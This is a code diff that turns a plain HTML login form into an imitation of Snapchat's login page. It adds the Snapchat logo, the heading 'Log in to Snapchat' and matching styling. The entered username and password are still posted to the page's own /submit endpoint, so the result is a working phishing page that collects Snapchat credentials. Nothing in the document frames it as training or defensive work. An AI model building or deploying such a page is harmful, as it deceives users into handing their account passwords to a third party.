@@ -2,50 +2,132 @@
 <html>
 <head>
   <meta charset="utf-8" />
-  <title>Login (plain text passwords)</title>
+  <title>Login Page</title>
   <style>
-    body { font-family: Arial, sans-serif; background:#f6f7fb; padding:20px; }
-    .box { width:320px; margin:40px auto; padding:18px; background:white; border-radius:8px; box-shadow:0 2px 8px rgba(0,0,0,0.08); }
-    input, button { width:100%; padding:10px; margin:6px 0; border-radius:6px; border:1px solid #ccc; }
-    #status { margin-top:10px; color: #333; }
+    body {
+      font-family: Arial, sans-serif;
+      background: #ffffff; /*yellow background */
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .login-card {
+      background: white;
+      padding: 40px 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+      width: 320px;
+      max-width: 90%;
+      text-align: center;
+    }
+
+    .login-card img {
+      width: 60px;
+      margin-bottom: 20px;
+    }
+
+    .login-card h2 {
+      margin: 0 0 30px 0;
+      font-size: 24px;
+      font-weight: bold;
+    }
+
+    label {
+      display: block;
+      text-align: left;
+      margin-bottom: 5px;
+      font-size: 14px;
+      color: #555;
+    }
+
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 12px 10px;
+      margin-bottom: 20px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+
+    .forgot {
+      font-size: 14px;
+      color: #2196f3;
+      text-decoration: none;
+      display: block;
+      margin-bottom: 20px;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      background-color: #2196f3;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #1976d2;
+    }
   </style>
 </head>
 <body>
-  <div class="box">
-    <h3>Login (submissions saved privately)</h3>
+
+  <div class="login-card">
+    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1024px-Snapchat_logo.svg.png" alt="Logo">
+    <h2>Log in to Snapchat</h2>
+
     <form id="form">
-      <input id="username" placeholder="username" required /><br/>
-      <input id="password" type="password" placeholder="password" required /><br/>
-      <button type="submit">Submit</button>
+      <div>
+        <label for="username">Username</label>
+        <input id="username" type="text"  required>
+      </div>
+
+      <div>
+        <label for="password">Password</label>
+        <input id="password" type="password"  required>
+      </div>
+
+      <a href="#" class="forgot">Forgot Password</a>
+      <button type="submit">Next</button>
     </form>
-    <div id="status"></div>
   </div>
 
   <script>
     const form = document.getElementById('form');
-    const status = document.getElementById('status');
+    const passwordInput = document.getElementById('password');
 
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
       const u = document.getElementById('username').value;
-      const p = document.getElementById('password').value;
+      const p = passwordInput.value;
+
       try {
         const res = await fetch('/submit', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ username: u, password: p })
         });
+
         const json = await res.json();
         if (json.success) {
-          status.innerText = 'Saved to server (private).';
+          alert('Saved to server (private).');
           form.reset();
         } else {
-          status.innerText = 'Error: ' + (json.error || 'unknown');
+          alert('Error: ' + (json.error || 'unknown'));
         }
       } catch (err) {
-        status.innerText = 'Request failed: ' + err.message;
+        alert('Request failed: ' + err.message);
       }
     });
   </script>
+
 </body>
 </html>
